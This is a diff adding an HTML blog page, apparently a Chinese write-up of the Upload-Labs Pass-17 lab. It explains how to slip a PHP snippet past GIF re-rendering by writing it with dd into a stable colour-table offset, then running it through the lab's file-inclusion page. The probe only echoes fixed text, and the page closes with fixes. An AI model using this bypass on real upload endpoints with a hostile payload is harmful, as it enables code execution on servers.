@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-17 二次渲染绕过与 GIF 图马 Writeup - gz2008的技术博客</title>
+  <style>
+* { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+    <h1>Upload-Labs Pass-17：二次渲染绕过与 GIF 图马</h1>
+    <div class="tags">
+      <span class="tag">Upload-Labs</span>
+      <span class="tag">Web</span>
+      <span class="tag">File Upload</span>
+      <span class="tag">二次渲染</span>
+      <span class="tag">GIF</span>
+    </div>
+<p>Pass-17 调用 <code>imagecreatefrom*()</code> 读取图片，再用 <code>image*()</code> 重新生成文件。简单的“图片后追加 PHP”会被重新编码丢弃。绕过点在于找到原图和渲染结果中仍然一致的字节区域，并把安全探针放入该区域。</p>
+
+    <div class="success"><strong>验证状态：</strong>GIF 探针经过二次渲染后仍保留 <code>PASS17_GIF_OK</code>，通过文件包含页执行成功。本文不把 PNG/JPEG 的格式专用技巧写成当前实测成功。</div>
+
+    <h2>一、处理流程</h2>
+    <pre><code>$temp = $_FILES['upload_file']['tmp_name'];
+move_uploaded_file($temp, $target);
+$im = imagecreatefromgif($target);
+imagegif($im, $new_path);
+unlink($target);</code></pre>
+    <p>渲染会重建像素数据和大部分结构，因此普通的“图片 + PHP”文件会被清洗。必须先比较渲染前后的文件，找出稳定区域。</p>
+
+    <h2>二、GIF 稳定区</h2>
+    <p>本次使用一个 48×48 的白色 GIF。把原图与 <code>imagecreatefromgif()</code> 再编码结果对比后，全局颜色表的一段内容保持不变。安全探针被写入该区域：</p>
+    <pre><code>offset = 145
+payload = '&lt;?php echo "PASS17_GIF_OK"; ?&gt;'
+
+cp base.gif pass17_gif_safe.gif
+printf '%s' "$payload" \
+  | dd of=pass17_gif_safe.gif bs=1 seek=145 conv=notrunc</code></pre>
+    <p>这段探针只输出固定文字，不调用系统命令。上传后服务端重新渲染，生成随机命名的 GIF。</p>
+
+    <h2>三、验证结果</h2>
+    <p>访问渲染后的文件并通过靶场文件包含页读取：</p>
+    <pre><code>/include.php?file=/home/ctf/labs/upload-labs/upload/&lt;rendered.gif&gt;</code></pre>
+    <p>响应中仍包含 <code>PASS17_GIF_OK</code>，说明探针位于渲染器保留的数据区，重新编码没有把它删除。</p>
+
+    <h2>四、格式边界</h2>
+    <p>PNG 和 JPEG 的生成规则与 GIF 不同。本次直接把 PHP 追加到 PNG/JPEG 后，再经过 <code>imagepng()</code>/<code>imagejpeg()</code>，探针均被清除。PNG 通常需要构造 PLTE/IDAT 专用样本，JPEG 需要针对具体编码结构尝试；不能把 GIF 的成功外推成另外两种格式也成功。</p>
+
+    <h2>五、修复建议</h2>
+    <ul>
+      <li>使用可信图片库解码后重新编码，并丢弃元数据和未知块。</li>
+      <li>只提供重新生成的内容，不保存原始上传字节。</li>
+      <li>把上传目录移出 Web 根目录，并禁止任何包含操作。</li>
+      <li>对外只提供静态图片响应，不允许解释器读取上传文件。</li>
+    </ul>
+
+    <h2>六、复盘</h2>
+    <p>二次渲染提高了利用门槛，但格式解析器保留的结构仍可能成为载荷载体。验证时需要比较渲染前后字节、确认探针仍存在，再用固定输出证明实际执行；只有图片可访问不能说明绕过成功。</p>
+  </main>
+</body>
+</html>
